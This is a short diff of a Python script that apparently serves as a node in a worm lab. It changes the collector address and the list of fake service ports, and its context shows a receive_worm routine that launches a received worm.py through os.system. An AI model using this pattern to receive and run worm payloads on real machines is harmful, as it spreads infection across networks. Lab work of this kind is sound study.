@@ -4,7 +4,7 @@ import os
 import json
 from datetime import datetime
 
-COLLECTOR_IP = "192.168.100.10"
+COLLECTOR_IP = "192.168.210.10"
 COLLECTOR_PORT = 8888
 
 def get_my_ip():
@@ -92,7 +92,7 @@ def receive_worm():
         os.system("python3 worm.py &")
 
 print("[SYSTEM] Starting fake services...")
-for port in [21, 22, 80, 443, 3306, 8080]:
+for port in [21, 22, 80, 443, 3306]:
     threading.Thread(target=open_port, args=(port,), daemon=True).start()
 print("[SYSTEM] Waiting for worm payload...")
 receive_worm()
